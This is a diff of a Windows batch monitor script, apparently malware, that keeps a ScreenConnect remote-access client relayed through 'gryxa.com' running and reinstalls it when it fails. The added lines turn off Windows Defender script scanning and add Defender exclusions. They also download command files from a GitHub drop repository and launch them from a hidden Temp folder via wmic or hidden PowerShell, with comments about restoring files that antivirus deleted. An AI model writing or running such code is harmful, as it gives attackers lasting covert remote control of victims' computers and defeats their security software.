@@ -1,6 +1,7 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M51
+rem  OWN_MON  BUILD 20260804M52
+rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
 rem  M49: FREEZE - no auto Gryxa msiexec from mon; start-only; manual force only.
@@ -50,7 +51,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M51"
+set "MONVER=M52"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -456,15 +457,7 @@ if not errorlevel 1 (
 rem FORCE push: queue Gryxa REINSTALL (panel wipe) then ack — freeze still blocks daily msiexec
 if "%FORCE_G%"=="1" (
   echo gryxa_force_push_reinstall>>"%LOG%"
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa_force.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa_force.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
-  if not exist "%WD%\own_gryxa_force.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa_force.cmd" "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_gryxa_force.cmd?t=%RANDOM%" >nul 2>&1
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
-  if exist "%WD%\own_gryxa_force.cmd" (
-    start "" /b cmd /c "call \"%WD%\own_gryxa_force.cmd\" \"%WD%\" >>\"%LOG%\" 2>&1"
-    echo gryxa_force_reinstall_queued>>"%LOG%"
-  ) else (
-    echo gryxa_force_reinstall_missing_cmd>>"%LOG%"
-  )
+  call :QueueGryxaHeal REINSTALL
   if exist "%WD%\force_gryxa.new" copy /y "%WD%\force_gryxa.new" "%WD%\force_gryxa.done" >nul 2>&1
   goto :GryxaAfter
 )
@@ -472,45 +465,101 @@ if "%FORCE_G%"=="1" (
 powershell -NoProfile -NonInteractive -Command "if(( -not (Test-Path '%GRYXA_DEEP%')) -or (((Get-Date)-(Get-Item -LiteralPath '%GRYXA_DEEP%' -Force).LastWriteTime).TotalHours -ge 8)){ exit 1 } else { exit 0 }" >nul 2>&1
 if errorlevel 1 set "DO_DEEP=1"
 
-rem Healthy + not deep due → zero work
-if "%GRYXA_OK%"=="1" if "%DO_DEEP%"=="0" (
-  echo gryxa_skip_already_healthy>>"%LOG%"
-  goto :GryxaAfter
-)
-
-rem M49 FREEZE: start-only; never msiexec/own_gryxa from mon
-if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
-if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
-if "%GRYXA_OK%"=="0" (
-  echo gryxa_mon_start_only>>"%LOG%"
-  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
-  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
-  timeout /t 5 /nobreak >nul
-  sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
-  if "%GRYXA_OK%"=="0" (
+rem Healthy + not deep due → still verify ImagePath has gryxa.com (bare sc create = false healthy)
+if "!GRYXA_OK!"=="1" (
+  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+  if errorlevel 1 (
+    set "GRYXA_OK=0"
     for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
       set "_FP=%%a"
       set "_FP=!_FP: =!"
       if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
         sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
         if not errorlevel 1 (
-          set "GRYXA_OK=1"
-          set "GRYXA_FP=!_FP!"
+          reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+          if not errorlevel 1 (
+            set "GRYXA_OK=1"
+            set "GRYXA_FP=!_FP!"
+          )
+        )
+      )
+    )
+    if "!GRYXA_OK!"=="0" echo gryxa_running_no_relay>>"%LOG%"
+  )
+)
+
+if "!GRYXA_OK!"=="1" if "%DO_DEEP%"=="0" (
+  echo gryxa_skip_already_healthy>>"%LOG%"
+  goto :GryxaAfter
+)
+
+rem restore lib if AV/AMSI deleted it (cmd-only)
+if not exist "%WD%\own_lib.ps1" (
+  echo gryxa_lib_missing_refetch>>"%LOG%"
+  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
+  reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.ps1" "%OWNLIB%" >nul 2>&1
+)
+
+rem M52 FREEZE + STUCK-HEAL: start-only when possible; queue G7 heal when 1060+dir or no-relay
+if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
+if exist "%WD%\gryxa_msi.lock" (
+  powershell -NoProfile -NonInteractive -Command "if(((Get-Date)-(Get-Item '%WD%\gryxa_msi.lock').LastWriteTime).TotalMinutes -gt 25){Remove-Item '%WD%\gryxa_msi.lock' -Force}" >nul 2>&1
+)
+if "!GRYXA_OK!"=="0" (
+  echo gryxa_mon_start_only>>"%LOG%"
+  sc config "ScreenConnect Client (%GRYXA_FP%)" start= auto >nul 2>&1
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  timeout /t 5 /nobreak >nul
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+  if not errorlevel 1 (
+    reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+    if not errorlevel 1 set "GRYXA_OK=1"
+  )
+  if "!GRYXA_OK!"=="0" (
+    for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+      set "_FP=%%a"
+      set "_FP=!_FP: =!"
+      if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
+        sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
+        if not errorlevel 1 (
+          reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+          if not errorlevel 1 (
+            set "GRYXA_OK=1"
+            set "GRYXA_FP=!_FP!"
+          )
         )
       )
     )
   )
 )
+
+rem stuck: install dir present but service 1060, OR still down → queue heal (rate-limited)
+set "NEED_HEAL=0"
+if "!GRYXA_OK!"=="0" (
+  if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" set "NEED_HEAL=1"
+  if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" set "NEED_HEAL=1"
+  if "!NEED_HEAL!"=="1" (
+    echo gryxa_stuck_or_dir_heal>>"%LOG%"
+  ) else (
+    set "NEED_HEAL=1"
+    echo gryxa_absent_queue_heal>>"%LOG%"
+  )
+)
+if "!NEED_HEAL!"=="1" call :QueueGryxaHeal HEAL
+
 if "%DO_DEEP%"=="1" echo done>"%GRYXA_DEEP%"
-echo gryxa_freeze_no_auto_install>>"%LOG%"
+echo gryxa_freeze_or_heal_done>>"%LOG%"
 
 :GryxaAfter
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GRYXA_OK=0"
 sc query "ScreenConnect Client (%GRYXA_FP%)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
-if not errorlevel 1 set "GRYXA_OK=1"
-rem M49: any non-sevrz Running SC is OK (adopt FP) — do not false-DOWN wrong gryxa.cfg
+if not errorlevel 1 (
+  reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (%GRYXA_FP%)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+  if not errorlevel 1 set "GRYXA_OK=1"
+)
+rem M52: any non-sevrz Running WITH gryxa.com ImagePath is OK
 if "%GRYXA_OK%"=="0" (
   for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
     set "_FP=%%a"
@@ -518,8 +567,11 @@ if "%GRYXA_OK%"=="0" (
     if /I not "!_FP!"=="%KEEP_FP%" if /I not "!_FP!"=="%ALT_FP%" (
       sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
       if not errorlevel 1 (
-        set "GRYXA_OK=1"
-        set "GRYXA_FP=!_FP!"
+        reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+        if not errorlevel 1 (
+          set "GRYXA_OK=1"
+          set "GRYXA_FP=!_FP!"
+        )
       )
     )
   )
@@ -574,17 +626,50 @@ endlocal
 exit /b 0
 
 rem ═══════════════ helpers ═══════════════
+:QueueGryxaHeal
+rem %1=REINSTALL|HEAL — rate-limit 90m; launch via wmic breakaway (survives Guest 10s)
+set "HEALMODE=%~1"
+if "%HEALMODE%"=="" set "HEALMODE=HEAL"
+powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\gryxa_heal.flag') -and (((Get-Date)-(Get-Item '%WD%\gryxa_heal.flag').LastWriteTime).TotalMinutes -lt 90)){exit 1}else{exit 0}" >nul 2>&1
+if errorlevel 1 (
+  echo gryxa_heal_rate_limited>>"%LOG%"
+  exit /b 0
+)
+echo %DATE% %TIME% %HEALMODE%>"%WD%\gryxa_heal.flag"
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScriptScanning /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%WD%" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "msiexec.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "ScreenConnect.ClientService.exe" /t REG_DWORD /d 0 /f >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA%" >nul 2>&1
+if not exist "%WD%\own_gryxa.cmd" "%CURL%" -L --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa.cmd" "%OWNGRYXA2%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 20 -o "%WD%\own_gryxa_force.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_gryxa_force.cmd?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
+if not exist "%SystemRoot%\Temp\.upd" mkdir "%SystemRoot%\Temp\.upd" >nul 2>&1
+> "%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd" (
+  echo @echo off
+  echo call "%WD%\own_gryxa.cmd" "%WD%" "%GRYXA_FP%" "%KEEP_FP%" "%ALT_FP%" %HEALMODE% ^>^>"%LOG%" 2^>^&1
+)
+wmic process call create "cmd.exe /c %SystemRoot%\Temp\.upd\gryxa_heal_once.cmd" >nul 2>&1
+if errorlevel 1 (
+  powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Start-Process cmd.exe -ArgumentList '/c','%SystemRoot%\Temp\.upd\gryxa_heal_once.cmd' -WindowStyle Hidden" >nul 2>&1
+)
+echo gryxa_heal_queued mode=%HEALMODE%>>"%LOG%"
+exit /b 0
+
 :EnsureGryxaMust
-rem M49 FREEZE: start-only - never spawn own_gryxa / msiexec
+rem M52: start-only; stuck → QueueGryxaHeal (never bare sc create)
 set "GRYXA_OK=0"
 if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "GRYXA_FP=%%L"
 set "GSVC=ScreenConnect Client (%GRYXA_FP%)"
 if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
 sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" /C:"CONTINUE_PENDING" >nul
 if not errorlevel 1 (
-  set "GRYXA_OK=1"
-  echo gryxa_must_already_alive>>"%LOG%"
-  exit /b 0
+  reg query "HKLM\SYSTEM\CurrentControlSet\Services\%GSVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+  if not errorlevel 1 (
+    set "GRYXA_OK=1"
+    echo gryxa_must_already_alive_relay>>"%LOG%"
+    exit /b 0
+  )
 )
 sc query "%GSVC%" >nul 2>&1
 if not errorlevel 1 (
@@ -593,9 +678,13 @@ if not errorlevel 1 (
   sc start "%GSVC%" >nul 2>&1
   timeout /t 8 /nobreak >nul
   sc query "%GSVC%" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
-  if not errorlevel 1 set "GRYXA_OK=1"
+  if not errorlevel 1 (
+    reg query "HKLM\SYSTEM\CurrentControlSet\Services\%GSVC%" /v ImagePath 2>nul | findstr /I "gryxa.com" >nul
+    if not errorlevel 1 set "GRYXA_OK=1"
+  )
 )
-if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down_no_install>>"%LOG%")
+if "%GRYXA_OK%"=="0" call :QueueGryxaHeal HEAL
+if "%GRYXA_OK%"=="1" (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_heal_queued>>"%LOG%")
 exit /b 0
 
 :TgGryxa
